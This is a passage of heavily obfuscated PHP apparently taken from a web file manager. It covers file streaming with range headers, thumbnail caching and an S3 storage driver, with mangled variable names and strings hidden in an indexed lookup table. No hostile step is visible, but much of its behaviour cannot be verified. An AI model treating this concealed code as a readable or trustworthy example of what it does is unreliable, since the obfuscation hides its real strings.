header("\103\x6f\x6e\164\x65\156\164\55\122\x61\x6e\147\x65\x3a\x20\x62\171\164\x65\163\x20{$äÄñÜúÖ}\55{$Ùš–úİ}\x2f" . $·ÊçÇ§ı); } else { header($ÍõÄèµ[155]); } header($ÍõÄèµ[156]); header($ÍõÄèµ[157]); $‡ µû® = !0; if ($_SERVER[$ÍõÄèµ[158]] == $ÍõÄèµ[159] && $·ÊçÇ§ı > 1204 * 1024 * 1024 * 2) { $‡ µû® = !1; } if ($‡ µû®) { header($ÍõÄèµ[160] . ($Ùš–úİ - $äÄñÜúÖ + 1)); } if ($_SERVER[$ÍõÄèµ[161]] == $ÍõÄèµ[162]) { return; } $¦€œä§å = array($ÍõÄèµ[163] => !1, $ÍõÄèµ[164] => $äÄñÜúÖ, $ÍõÄèµ[165] => $Ùš–úİ, $ÍõÄèµ[166] => $¸Æİ•Ì¬, $ÍõÄèµ[167] => $º¦ãüƒƒ, $ÍõÄèµ[168] => $ÍõÄèµ[12], $ÍõÄèµ[169] => 0); $¦€œä§å = Hook::filter($ÍõÄèµ[170], $¦€œä§å); $‰…î½ë× = 1024 * 300; $ŒÃŒçç = 0; if ($æûíÁ™µ) { $ŒÃŒçç = intval(1000 * 1000 * ($‰…î½ë× / $æûíÁ™µ)); } while ($äÄñÜúÖ <= $Ùš–úİ) { $Úªúâ·å = timeFloat(); check_abort(); $³ÓØÖÚ = $Ùš–úİ - $äÄñÜúÖ + 1; if ($³ÓØÖÚ <= $‰…î½ë×) { $‰…î½ë× = $³ÓØÖÚ; } $åì€À§Ğ = $this->fileSubstr($’Æ¡±Îà, $äÄñÜúÖ, $‰…î½ë×); if ($¦€œä§å[$ÍõÄèµ[163]]) { $¦€œä§å[$ÍõÄèµ[168]] = $åì€À§Ğ; $¦€œä§å[$ÍõÄèµ[169]] = $äÄñÜúÖ; $¦€œä§å = Hook::filter($ÍõÄèµ[171], $¦€œä§å); $åì€À§Ğ = $¦€œä§å[$ÍõÄèµ[168]]; } echo $åì€À§Ğ; $äÄñÜúÖ += $‰…î½ë×; if ($‰…î½ë× == $³ÓØÖÚ) { $äÄñÜúÖ = $Ùš–úİ + 1; } if ($ŒÃŒçç) { $–»¾ø = intval(1000 * 1000 * (timeFloat() - $Úªúâ·å)); $¦’ëÚ—• = $ŒÃŒçç - $–»¾ø; if ($¦’ëÚ—• > 5) { usleep($¦’ëÚ—•); } } } } public function fileOutServer($©İªÔÓß, $®™ñ†Òñ = false, $¶òöÓÃ = false, $Ùòè‡Ÿ™ = '') { $this->fileOut($©İªÔÓß, $®™ñ†Òñ, $¶òöÓÃ, $Ùòè‡Ÿ™); } public function fileOutLink($øÒùöÊ‘) { header($_SERVER[œ—üé‹ê][172] . $øÒùöÊ‘); die; } public function cacheMethod($ç›è†ÎÛ, $’½õ¥¥„, $×çîûÃş = null) { $ôÂéºÈ =& $_SERVER[œ—üé‹ê]; static $ÕÙŠ€«„ = array(); $Ø¿¼¸şÃ = $’½õ¥¥„ ? ltrim($this->getPathOuter($’½õ¥¥„), $ôÂéºÈ[8]) : $ôÂéºÈ[12]; $¹¡¨–šá = $ôÂéºÈ[173] . $ç›è†ÎÛ . $ôÂéºÈ[174] . rtrim($Ø¿¼¸şÃ, $ôÂéºÈ[8]); if (is_null($ç›è†ÎÛ)) { $ÕÙŠ€«„ = array(); return; } if (is_null($’½õ¥¥„)) { foreach ($ÕÙŠ€«„ as $¹¡¨–šá => $ØºÇ³†À) { if (!strstr($¹¡¨–šá, $ôÂéºÈ[173] . $ç›è†ÎÛ . $ôÂéºÈ[175])) { continue; } unset($ÕÙŠ€«„[$¹¡¨–šá]); } return; } if ($×çîûÃş === $ôÂéºÈ[176]) { unset($ÕÙŠ€«„[$¹¡¨–šá]); return; } if (!is_null($×çîûÃş)) { $ÕÙŠ€«„[$¹¡¨–šá] = $×çîûÃş; return; } $¬ı¯ƒª¼ = isset($ÕÙŠ€«„[$¹¡¨–šá]) ? $ÕÙŠ€«„[$¹¡¨–šá] : null; if (!is_null($¬ı¯ƒª¼)) { return $¬ı¯ƒª¼; } $¬ı¯ƒª¼ = $this->{$ç›è†ÎÛ}($’½õ¥¥„); $ÕÙŠ€«„[$¹¡¨–šá] = $¬ı¯ƒª¼; return $¬ı¯ƒª¼; } public function cacheMethodInfoSet($şö»ë»¶, $¦‡üÚ±¦, $ Ì©é¡Š = false) { $´ æ ÷¢ =& $_SERVER[œ—üé‹ê]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($´ æ ÷¢[177], $şö»ë»¶, $¦‡üÚ±¦); $this->cacheMethod($´ æ ÷¢[178], $şö»ë»¶, $¦‡üÚ±¦ ? !1 : !0); if (is_array($ Ì©é¡Š)) { $this->cacheMethod($´ æ ÷¢[179], $şö»ë»¶, $ Ì©é¡Š); } } public function fileOutImage($²ñÀÜü£, $çáÅ“£İ = 250) { $¶‘Ä®Í =& $_SERVER[œ—üé‹ê]; set_timeout(); if (substr($²ñÀÜü£, 0, 4) == $¶‘Ä®Í[149]) { $this->fileOutLink($²ñÀÜü£); } $æâªÀ˜ = $this->info($²ñÀÜü£); $Áå°ï§Ê = !1; $¹î¯Àâ† = isset($GLOBALS[$¶‘Ä®Í[180]]) ? $GLOBALS[$¶‘Ä®Í[180]] : array(); if ($¹î¯Àâ† && $¹î¯Àâ†[$¶‘Ä®Í[181]] == $æâªÀ˜[$¶‘Ä®Í[87]]) { $æâªÀ˜ = $¹î¯Àâ†; $é­ùé“ = $æâªÀ˜[$¶‘Ä®Í[182]]; if ($é­ùé“ && isset($é­ùé“[$¶‘Ä®Í[183]])) { if ($é­ùé“[$¶‘Ä®Í[183]] <= $çáÅ“£İ && $é­ùé“[$¶‘Ä®Í[184]] <= $çáÅ“£İ) { $Áå°ï§Ê = !0; } } } if ($æâªÀ˜[$¶‘Ä®Í[79]] <= 1024 * 50 || $Áå°ï§Ê || !function_exists($¶‘Ä®Í[185]) || $æâªÀ˜[$¶‘Ä®Í[166]] == $¶‘Ä®Í[186]) { return $this->fileOut($²ñÀÜü£, !1, $æâªÀ˜[$¶‘Ä®Í[32]]); } $è¹…©ê = kodIO::hashPath($æâªÀ˜); $‹ôµöµŠ = "\x63\157\166\x65\x72\137{$è¹…©ê}\137{$çáÅ“£İ}\56\160\x6e\x67"; $èùµ„Â = IO_PATH_SYSTEM_TEMP . $¶‘Ä®Í[187]; $ßòáî•² = IO::infoFullSimple($èùµ„Â); $Ä¡ˆ‹¡ = $ßòáî•² && is_array($ßòáî•²) ? $ßòáî•²[$¶‘Ä®Í[87]] : $¶‘Ä®Í[12]; if (!$Ä¡ˆ‹¡) { $Ä¡ˆ‹¡ = IO::mkdir($èùµ„Â); } if ($æâªÀ˜[$¶‘Ä®Í[188]] == $¶‘Ä®Í[189] && isset($æâªÀ˜[$¶‘Ä®Í[190]]) && $æâªÀ˜[$¶‘Ä®Í[190]] == kodIO::sourceID($Ä¡ˆ‹¡)) { $»Ë‹Ó… = $æâªÀ˜[$¶‘Ä®Í[191]]; if ($çáÅ“£İ <= 500) { $±±¤¿şş = preg_replace($¶‘Ä®Í[192], $¶‘Ä®Í[193], $æâªÀ˜[$¶‘Ä®Í[32]]); $»Ë‹Ó… = IO::fileNameExist($Ä¡ˆ‹¡, $±±¤¿şş); } return IO::fileOut(KodIO::make($»Ë‹Ó…), !1, $æâªÀ˜[$¶‘Ä®Í[32]]); } $œ†Óñˆ¤ = IO::fileNameExist($Ä¡ˆ‹¡, $‹ôµöµŠ); if ($œ†Óñˆ¤) { return IO::fileOut(KodIO::make($œ†Óñˆ¤), !1, $æâªÀ˜[$¶‘Ä®Í[32]]); } if ($çáÅ“£İ > 1000) { $this->makeImageCover($Ä¡ˆ‹¡, $²ñÀÜü£, $‹ôµöµŠ, $çáÅ“£İ); $this->makeImageCover($Ä¡ˆ‹¡, $²ñÀÜü£, "\x63\157\166\145\162\x5f{$è¹…©ê}\137\62\65\60\56\160\x6e\x67", 250); $œ†Óñˆ¤ = IO::fileNameExist($Ä¡ˆ‹¡, $‹ôµöµŠ); if ($œ†Óñˆ¤) { return IO::fileOut(KodIO::make($œ†Óñˆ¤), !1, $æâªÀ˜[$¶‘Ä®Í[32]]); } die; } if (!kodIO::allowCover($æâªÀ˜)) { return $this->fileOut($²ñÀÜü£, !1, $æâªÀ˜[$¶‘Ä®Í[32]]); } $Üö¶Ş´ = Cache::get($‹ôµöµŠ); if ($Üö¶Ş´ == $¶‘Ä®Í[194] || $Üö¶Ş´ == $¶‘Ä®Í[195]) { echo $Üö¶Ş´; die; } Cache::set($‹ôµöµŠ, $¶‘Ä®Í[195], 60); $»³ïÕ‚Ë = array($Ä¡ˆ‹¡, $æâªÀ˜[$¶‘Ä®Í[87]], $‹ôµöµŠ, $çáÅ“£İ); $¼úöŞ« = $¶‘Ä®Í[196] . $æâªÀ˜[$¶‘Ä®Í[79]] . $¶‘Ä®Í[197] . $‹ôµöµŠ . $¶‘Ä®Í[198] . $æâªÀ˜[$¶‘Ä®Í[32]] . $¶‘Ä®Í[199] . $æâªÀ˜[$¶‘Ä®Í[87]]; TaskQueue::add($¶‘Ä®Í[200], $»³ïÕ‚Ë, $¼úöŞ«, $‹ôµöµŠ); } public function makeImageCover($ÛÏİÙ€“, $ªû¡ù³å, $×ÔÚ£ü, $æÌşØó) { $İöÎ¯ÇÊ =& $_SERVER[œ—üé‹ê]; if (IO::fileNameExist($ÛÏİÙ€“, $×ÔÚ£ü)) { return $İöÎ¯ÇÊ[201]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $«£ŒÆüó = $this->getPathOuter($ªû¡ù³å); $ô¶…Ùùµ = DATA_THUMB . $×ÔÚ£ü; del_file($ô¶…Ùùµ); $¯èßıµñ = IO::copy($«£ŒÆüó, TEMP_FILES, !1, $×ÔÚ£ü); if (!@file_exists($¯èßıµñ)) { return $İöÎ¯ÇÊ[202]; } ImageThumb::createThumb($¯èßıµñ, $ô¶…Ùùµ, $æÌşØó, $æÌşØó * 10); if (@file_exists($ô¶…Ùùµ)) { Cache::remove($×ÔÚ£ü); return IO::move($ô¶…Ùùµ, $ÛÏİÙ€“); } Cache::set($×ÔÚ£ü, $İöÎ¯ÇÊ[194], 600); del_file($ô¶…Ùùµ); return $İöÎ¯ÇÊ[203] . $¯èßıµñ . $İöÎ¯ÇÊ[74]; } public function fileOutImageServer($Š””»ı, $ìÊİ…•Á = 250) { $this->fileOutImage($Š””»ı, $ìÊİ…•Á); } public function fileNameAuto($ù®š”’–, $¢ƒ´Œ“, $Ö¢ÎìÁ¤ = REPEAT_RENAME, $¯ä¤„šŒ = false) { $´á‹Æ¹Ì =& $_SERVER[œ—üé‹ê]; $Şçß²™Å = $ù®š”’– === $´á‹Æ¹Ì[12] ? $¢ƒ´Œ“ : rtrim($ù®š”’–, $´á‹Æ¹Ì[8]) . $´á‹Æ¹Ì[8] . $¢ƒ´Œ“; if ($Ö¢ÎìÁ¤ == REPEAT_REPLACE || !$this->exist($Şçß²™Å) || $¯ä¤„šŒ && $Ö¢ÎìÁ¤ != REPEAT_RENAME_FOLDER) { return $¢ƒ´Œ“; } if ($Ö¢ÎìÁ¤ == REPEAT_SKIP) { return !1; } $ÚÉŒ²è° = $´á‹Æ¹Ì[10] . get_path_ext($¢ƒ´Œ“); $ÚÉŒ²è° = $ÚÉŒ²è° == $´á‹Æ¹Ì[10] || $¯ä¤„šŒ ? $´á‹Æ¹Ì[12] : $ÚÉŒ²è°; $€•½¥›š = 1; $Úğ‡¼ã = substr($¢ƒ´Œ“, 0, strlen($¢ƒ´Œ“) - strlen($ÚÉŒ²è°)); $è†Œõ¦Õ = $Úğ‡¼ã . "\50{$€•½¥›š}\51{$ÚÉŒ²è°}"; while ($this->exist(rtrim($ù®š”’–, $´á‹Æ¹Ì[8]) . $´á‹Æ¹Ì[8] . $è†Œõ¦Õ)) { $è†Œõ¦Õ = $Úğ‡¼ã . "\x28{$€•½¥›š}\x29{$ÚÉŒ²è°}"; $€•½¥›š++; } return $è†Œõ¦Õ; } private function fileNameAutoList($ÍÂö¦›Ñ, $º™ÓÔë¥, $ÜÇïéƒ = false) { $’ÃíäôÇ =& $_SERVER[œ—üé‹ê]; $˜à°”©ò = $this->listPath($ÍÂö¦›Ñ, !0); $˜à°”©ò = array_merge($˜à°”©ò[$’ÃíäôÇ[85]], $˜à°”©ò[$’ÃíäôÇ[86]]); $†“×±ş = array_to_keyvalue($˜à°”©ò, $’ÃíäôÇ[12], $’ÃíäôÇ[32]); $ß Íä†Ÿ = $’ÃíäôÇ[10] . get_path_ext($º™ÓÔë¥); $ß Íä†Ÿ = $ß Íä†Ÿ == $’ÃíäôÇ[10] || $ÜÇïéƒ ? $’ÃíäôÇ[12] : $ß Íä†Ÿ; $Îşş›¤‘ = substr($º™ÓÔë¥, 0, strlen($º™ÓÔë¥) - strlen($ß Íä†Ÿ)); $‡Š´‰Ëş = $Îşş›¤‘ . "\50\x30\x29{$ß Íä†Ÿ}"; for ($¯ßˆ¥íñ = 1; $¯ßˆ¥íñ <= count($†“×±ş) + 1; $¯ßˆ¥íñ++) { $‡Š´‰Ëş = $Îşş›¤‘ . "\50{$¯ßˆ¥íñ}\51{$ß Íä†Ÿ}"; if (!in_array_not_case($‡Š´‰Ëş, $†“×±ş)) { return $‡Š´‰Ëş; } } return $‡Š´‰Ëş; } public function listAllFiles($„«¯ñ’, $õ†Œ÷é) { $¶¦ÁÉûÙ =& $_SERVER[œ—üé‹ê]; if (empty($õ†Œ÷é)) { return array(); } $äµ¦šîŠ = array_keys($õ†Œ÷é); $”»ù“‹È = array(); $„«¯ñ’ = trim($„«¯ñ’, $¶¦ÁÉûÙ[8]); foreach ($õ†Œ÷é as $ûşçšĞ¤ => $ÏàèÇ×µ) { $³êÛ·› = ltrim(substr(trim($ûşçšĞ¤, $¶¦ÁÉûÙ[8]), strlen($„«¯ñ’)), $¶¦ÁÉûÙ[8]); if (substr($ûşçšĞ¤, -1) == $¶¦ÁÉûÙ[8]) { $³êÛ·› = rtrim($³êÛ·›, $¶¦ÁÉûÙ[8]) . $¶¦ÁÉûÙ[8]; } $”»ù“‹È = array_merge($”»ù“‹È, $this->slicePath($³êÛ·›)); } $´¶îôÑË = array(); foreach (array_unique($”»ù“‹È) as $êş„ú°Ç) { $½Í¥ä‰™ = array($¶¦ÁÉûÙ[87] => $this->getPathOuter($¶¦ÁÉûÙ[8] . $„«¯ñ’ . $¶¦ÁÉûÙ[8] . $êş„ú°Ç), $¶¦ÁÉûÙ[78] => 1, $¶¦ÁÉûÙ[79] => 0); if (substr($êş„ú°Ç, -1) != $¶¦ÁÉûÙ[8]) { $½Í¥ä‰™[$¶¦ÁÉûÙ[78]] = 0; $ÎÂ¦ÔºÜ = $this->getPath($„«¯ñ’ . $¶¦ÁÉûÙ[8] . $êş„ú°Ç); if (isset($õ†Œ÷é[$ÎÂ¦ÔºÜ])) { $Ùòá°ïÑ = $õ†Œ÷é[$ÎÂ¦ÔºÜ]; if (isset($Ùòá°ïÑ[$¶¦ÁÉûÙ[79]])) { $½Í¥ä‰™[$¶¦ÁÉûÙ[79]] = intval($Ùòá°ïÑ[$¶¦ÁÉûÙ[79]]); } if (isset($Ùòá°ïÑ[$¶¦ÁÉûÙ[204]])) { $½Í¥ä‰™[$¶¦ÁÉûÙ[88]] = intval($Ùòá°ïÑ[$¶¦ÁÉûÙ[204]]); } } } $´¶îôÑË[] = $½Í¥ä‰™; } return $´¶îôÑË; } public function slicePath($Ñ¨ã„¨ç) { $º‰‰›Ó =& $_SERVER[œ—üé‹ê]; $œ—³ğ¢š = explode($º‰‰›Ó[8], trim($Ñ¨ã„¨ç, $º‰‰›Ó[8])); $ä«­óïû = 0; do { ++$ä«­óïû; $á£®¯ó[] = implode($º‰‰›Ó[8], array_slice($œ—³ğ¢š, 0, $ä«­óïû)) . $º‰‰›Ó[8]; } while ($ä«­óïû < count($œ—³ğ¢š)); $á£®¯ó[count($œ—³ğ¢š) - 1] = $Ñ¨ã„¨ç; return $á£®¯ó; } public function getHost() { $«”·İïÖ =& $_SERVER[œ—üé‹ê]; $ÙÁæÑ¥„ = parse_url(trim($this->domain, $«”·İïÖ[8])); $°¶…™îÛ = isset($ÙÁæÑ¥„[$«”·İïÖ[205]]) ? $ÙÁæÑ¥„[$«”·İïÖ[205]] : http_type(); $ÇÙõĞ«† = isset($ÙÁæÑ¥„[$«”·İïÖ[206]]) ? $ÙÁæÑ¥„[$«”·İïÖ[206]] : $ÙÁæÑ¥„[$«”·İïÖ[87]]; if (isset($ÙÁæÑ¥„[$«”·İïÖ[207]])) { $ÇÙõĞ«† .= $«”·İïÖ[4] . $ÙÁæÑ¥„[$«”·İïÖ[207]]; } return $°¶…™îÛ . $«”·İïÖ[208] . $ÇÙõĞ«†; } public function pathEncode($ÅÉ¹ƒé­) { $÷éèİ¹È =& $_SERVER[œ—üé‹ê]; return str_replace($÷éèİ¹È[209], $÷éèİ¹È[8], rawurlencode($ÅÉ¹ƒé­)); } public function writeLog($ü·©Á÷¯ = '', $×½Ç‡ÇÍ = false) { $À¾öä´ =& $_SERVER[œ—üé‹ê]; $›·Åš = in_array(ACTION, array($À¾öä´[210], $À¾öä´[211])); if (!$›·Åš && !GLOBAL_DEBUG) { return; } $ó«³¶Ø = $ü·©Á÷¯; static $ÖìØ¾ÀÎ = null; if (!$ÖìØ¾ÀÎ) { $ÖìØ¾ÀÎ = strtoupper($this->getType()); } $ü·©Á÷¯ = $ÖìØ¾ÀÎ . $À¾öä´[212] . $ü·©Á÷¯; if ($×½Ç‡ÇÍ) { $Éí‹²ğ = error_get_last(); if ($Éí‹²ğ) { $ü·©Á÷¯ = array($ü·©Á÷¯, $Éí‹²ğ); } } write_log($ü·©Á÷¯, $À¾öä´[213]); if ($›·Åš) { throw new Exception($ó«³¶Ø); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($²ˆœµ¬) { set_timeout(); require_once SDK_DIR . $_SERVER[œ—üé‹ê][214]; parent::__construct(); $this->_init($²ˆœµ¬); } public function _init($‡Å¸½š) { $¤ëÊû² =& $_SERVER[œ—üé‹ê]; $this->config = $‡Å¸½š; foreach ($‡Å¸½š as $¶¶“É”µ => $‡œÆªş†) { if (isset($this->{$¶¶“É”µ})) { $this->{$¶¶“É”µ} = $‡œÆªş†; } } $this->endpoint = $‡Å¸½š[$¤ëÊû²[215]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $İÁŠ­ËÕ = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($İÁŠ­ËÕ, 0, 7) == $¤ëÊû²[216]) { $İÁŠ­ËÕ = $¤ëÊû²[217] . substr($İÁŠ­ËÕ, 7); } $this->client->setEndpoint($İÁŠ­ËÕ); if (in_array(ACTION, array($¤ëÊû²[210], $¤ëÊû²[211]))) { $this->client->setExceptions(); } } public function setSignVersion($„¶µ¿‹‚ = "\x76\x34") { $this->signVer = $„¶µ¿‹‚; $this->client->setSignVersion($„¶µ¿‹‚); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $ˆ‰£âÔ„) { return null; } } public function isBucketCors() { $»ÂÆßşÁ =& $_SERVER[œ—üé‹ê]; $ÛğåÛ¤‡ = $this->getBucketCors(); if (!$ÛğåÛ¤‡ || !is_array($ÛğåÛ¤‡)) { return !1; } if (!is_array($ÛğåÛ¤‡[$»ÂÆßşÁ[218]])) { $ÛğåÛ¤‡[$»ÂÆßşÁ[218]] = explode($»ÂÆßşÁ[50], $ÛğåÛ¤‡[$»ÂÆßşÁ[218]]); } if ($ÛğåÛ¤‡[$»ÂÆßşÁ[219]] != $»ÂÆßşÁ[220] || !in_array($»ÂÆßşÁ[220], $ÛğåÛ¤‡[$»ÂÆßşÁ[218]])) { return !1; } $€¿²Š’È = array_map($»ÂÆßşÁ[221], $ÛğåÛ¤‡[$»ÂÆßşÁ[222]]); if (!is_array($€¿²Š’È)) { $€¿²Š’È = array(); } $«”ç­ëù = array($»ÂÆßşÁ[223], $»ÂÆßşÁ[224], $»ÂÆßşÁ[225], $»ÂÆßşÁ[226], $»ÂÆßşÁ[227]); $¼Õ³ÂëÓ = array_diff($«”ç­ëù, $€¿²Š’È); return empty($¼Õ³ÂëÓ); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function setRegion($àï€¼äÙ) { return $this->client->setRegion($àï€¼äÙ); } public function mkfile($àãôÒäÍ, $Úá­ì•İ = '', $§Ò“¨Ú¹ = REPEAT_RENAME) { $¯’Ù¹‘ = $this->setContent($àãôÒäÍ, $Úá­ì•İ); if ($¯’Ù¹‘ !== !1) { return $this->getPathOuter($àãôÒäÍ); } return !1; } public function mkdir($ŠŞÏ¾Ï¬, $‰‘Ì¢³õ = REPEAT_SKIP) { $’ÌùˆÂƒ =& $_SERVER[œ—üé‹ê]; if (empty($ŠŞÏ¾Ï¬) && $ŠŞÏ¾Ï¬ !== $’ÌùˆÂƒ[228]) { return !1; } if ($‰‘Ì¢³õ && $this->_isFolder($ŠŞÏ¾Ï¬)) { return $this->getPathOuter($ŠŞÏ¾Ï¬); } $’ô°÷´Ì = $this->setContent($ŠŞÏ¾Ï¬, $’ÌùˆÂƒ[12], !0); if ($’ô°÷´Ì !== !1) { return $this->getPathOuter($ŠŞÏ¾Ï¬); } return !1; } public function copyFile($…àïÀ¾“, $á»áïµ¤, $¦¸Û¤µå = array()) { $…ü™ûÕà =& $_SERVER[œ—üé‹ê]; $œ³şô±Ù = $this->objectMeta($…àïÀ¾“); if (!$œ³şô±Ù) { return !1; } if ($œ³şô±Ù[$…ü™ûÕà[79]] <= 1024 * 1024 * 200) { $ƒ¬Ì»« = $this->client->copyObject($this->bucket, $…àïÀ¾“, $this->bucket, $á»áïµ¤, $…ü™ûÕà[229], $¦¸Û¤µå); } else { $ƒ¬Ì»« = $this->client->multiCopyObject($this->bucket, $…àïÀ¾“, $this->bucket, $á»áïµ¤, $¦¸Û¤µå); } $ƒ¬Ì»« = $ƒ¬Ì»« ? $this->getPathOuter($á»áïµ¤) : !1; return $ƒ¬Ì»«; } public function moveFile($æŒÃ–À„, $Â’¢œ) { if ($this->copyFile($æŒÃ–À„, $Â’¢œ)) { $this->delFile($æŒÃ–À„); return $this->getPathOuter($Â’¢œ); } return !1; } public function delFile($å¨®’Ñ) { return $this->client->deleteObject($this->bucket, $å¨®’Ñ); } public function delFolder($Æû’ŸË) { $¯î·Öº =& $_SERVER[œ—üé‹ê]; if (!$this->exist($Æû’ŸË)) { return !0; } $this->listItemCache = !1; $šÛ±ş¨‡ = $this->fileList($Æû’ŸË); $this->listItemCache = !0; $ÁÕÈš·Ë = trim($Æû’ŸË, $¯î·Öº[8]) . $¯î·Öº[8]; if (!empty($Æû’ŸË) && $Æû’ŸË !== $¯î·Öº[228] && !in_array($ÁÕÈš·Ë, $šÛ±ş¨‡[$¯î·Öº[85]])) { $šÛ±ş¨‡[$¯î·Öº[85]][] = $ÁÕÈš·Ë; } $‚Ùô¬×ì = $this->delByBatch($šÛ±ş¨‡[$¯î·Öº[86]]); if (!$‚Ùô¬×ì) { return !1; } $‚Ùô¬×ì = $this->delByBatch($šÛ±ş¨‡[$¯î·Öº[85]]); if (!$‚Ùô¬×ì) { return !1; } return $this->delFile($ÁÕÈš·Ë); } private function delByBatch($òØ­€Íı) { foreach (array_chunk($òØ­€Íı, 1000) as $Ì£®« ) { $üŠ¥Ì÷“ = $this->client->deleteObjects($this->bucket, $Ì£®« ); if (!$üŠ¥Ì÷“) { return !1; } } return !0; } public function rename($´÷›¹å¾, $½°‹ø÷ä) { return $this->renameObject($´÷›¹å¾, $½°‹ø÷ä); } public function listPath($ú§„ÄáÚ, $çÛ–ôŒ = false) { $À¬¯¬ó =& $_SERVER[œ—üé‹ê]; $´¹ˆÒöÕ = $this->fileList($ú§„ÄáÚ, $À¬¯¬ó[8], !0); foreach ($´¹ˆÒöÕ[$À¬¯¬ó[85]] as $ÆÁĞòè => $¸«ÄÓÊû) { $´¹ˆÒöÕ[$À¬¯¬ó[85]][$ÆÁĞòè] = $this->folderInfo($¸«ÄÓÊû, $çÛ–ôŒ, $¸«ÄÓÊû); } foreach ($´¹ˆÒöÕ[$À¬¯¬ó[86]] as $ÆÁĞòè => $¸«ÄÓÊû) { $´¹ˆÒöÕ[$À¬¯¬ó[86]][$ÆÁĞòè] = $this->fileInfo($¸«ÄÓÊû[$À¬¯¬ó[32]], $çÛ–ôŒ, $¸«ÄÓÊû); } return $´¹ˆÒöÕ; } protected function infoChildren($ÜØæ÷º, &$¦æ®îòÑ) { $¤ÇğÃß =& $_SERVER[œ—üé‹ê]; $ª°‹ô†Ó = $this->fileList($ÜØæ÷º, $¤ÇğÃß[12], !0); $¦æ®îòÑ[$¤ÇğÃß[81]] += count($ª°‹ô†Ó[$¤ÇğÃß[85]]); $¦æ®îòÑ[$¤ÇğÃß[80]] += count($ª°‹ô†Ó[$¤ÇğÃß[86]]); foreach ($ª°‹ô†Ó[$¤ÇğÃß[86]] as $‚¦Æ£Ÿ) { if (!$‚¦Æ£Ÿ || !$‚¦Æ£Ÿ[$¤ÇğÃß[79]]) { continue; } $¦æ®îòÑ[$¤ÇğÃß[79]] += $‚¦Æ£Ÿ[$¤ÇğÃß[79]]; } } private function fileInfo($‘ËöúÖ, $ùêó£ğ = false, $¤â˜üÚÀ = array()) { $™úÑş³ª =& $_SERVER[œ—üé‹ê]; $øóÉ’¨­ = array($™úÑş³ª[32] => $this->pathThis($‘ËöúÖ), $™úÑş³ª[87] => $this->getPathOuter($‘ËöúÖ), $™úÑş³ª[33] => $™úÑş³ª[230], $™úÑş³ª[166] => $this->ext($‘ËöúÖ), $™úÑş³ª[79] => isset($¤â˜üÚÀ[$™úÑş³ª[79]]) ? $¤â˜üÚÀ[$™úÑş³ª[79]] : 0); if ($ùêó£ğ) { return $øóÉ’¨­; } $øóÉ’¨­[$™úÑş³ª[231]] = $øóÉ’¨­[$™úÑş³ª[88]] = 0; $øóÉ’¨­[$™úÑş³ª[232]] = $øóÉ’¨­[$™úÑş³ª[233]] = !0; if (empty($¤â˜üÚÀ)) { $¤â˜üÚÀ = $this->objectMeta($‘ËöúÖ); if (!$¤â˜üÚÀ) { return $øóÉ’¨­; } } if (isset($¤â˜üÚÀ[$™úÑş³ª[234]]) && $¤â˜üÚÀ[$™úÑş³ª[234]]) { $øóÉ’¨­[$™úÑş³ª[235]] = $¤â˜üÚÀ[$™úÑş³ª[234]]; } if (isset($¤â˜üÚÀ[$™úÑş³ª[204]])) { $øóÉ’¨­[$™úÑş³ª[88]] = $¤â˜üÚÀ[$™úÑş³ª[204]]; } if (isset($¤â˜üÚÀ[$™úÑş³ª[79]])) { $øóÉ’¨­[$™úÑş³ª[79]] = $¤â˜üÚÀ[$™úÑş³ª[79]]; } return $øóÉ’¨­; } private function folderInfo($¤±ƒ­ªï, $¥šËÆê£ = false, $³±Ü‚µ¶ = array()) { $¾¤ì¡®¶ =& $_SERVER[œ—üé‹ê]; $Ø•Ñ£âü = array($¾¤ì¡®¶[32] => $this->pathThis($¤±ƒ­ªï), $¾¤ì¡®¶[87] => $this->getPathOuter($¾¤ì¡®¶[8] . $¤±ƒ­ªï), $¾¤ì¡®¶[33] => $¾¤ì¡®¶[78]); if ($¥šËÆê£) { return $Ø•Ñ£âü; } $Ø•Ñ£âü[$¾¤ì¡®¶[231]] = $Ø•Ñ£âü[$¾¤ì¡®¶[88]] = 0; $Ø•Ñ£âü[$¾¤ì¡®¶[232]] = $Ø•Ñ£âü[$¾¤ì¡®¶[233]] = !0; if ($¤±ƒ­ªï == $¾¤ì¡®¶[12]) { return $Ø•Ñ£âü; } if (empty($³±Ü‚µ¶)) { $³±Ü‚µ¶ = $this->objectMeta(trim($¤±ƒ­ªï, $¾¤ì¡®¶[8]) . $¾¤ì¡®¶[8]); } if (isset($³±Ü‚µ¶[$¾¤ì¡®¶[204]])) { $Ø•Ñ£âü[$¾¤ì¡®¶[231]] = $³±Ü‚µ¶[$¾¤ì¡®¶[204]]; } return $Ø•Ñ£âü; } private function fileList($¾¼÷Á‡Ñ, $™µ¶Ç€Â = '', $‹ïß¯ı = 0) { $ò¢õ÷í° =& $_SERVER[œ—üé‹ê]; $İºğÚ¨ = rtrim($¾¼÷Á‡Ñ, $ò¢õ÷í°[8]) . $ò¢õ÷í°[8]; $£úŒğÙ = $this->listObjs($İºğÚ¨, null, null, $™µ¶Ç€Â); if (!$£úŒğÙ) { return array($ò¢õ÷í°[85] => array(), $ò¢õ÷í°[86] => array()); } $ª“İ—¤ô = $ÇÇûŒæ = array(); foreach ($£úŒğÙ[$ò¢õ÷í°[236]] as $ş£İÓÑ) { $—ˆ©ïµù = $ş£İÓÑ[$ò¢õ÷í°[32]]; if ($—ˆ©ïµù == $İºğÚ¨) { continue; } $†ÎŒ‹ÆÇ = isset($ş£İÓÑ[$ò¢õ÷í°[79]]) ? $ş£İÓÑ[$ò¢õ÷í°[79]] : 0; $›Ë×„¤§ = $†ÎŒ‹ÆÇ == 0 && substr($—ˆ©ïµù, strlen($—ˆ©ïµù) - 1, 1) == $ò¢õ÷í°[8] ? !0 : !1; $this->cacheMethodInfoSet($—ˆ©ïµù, $›Ë×„¤§, $ş£İÓÑ); if ($›Ë×„¤§) { 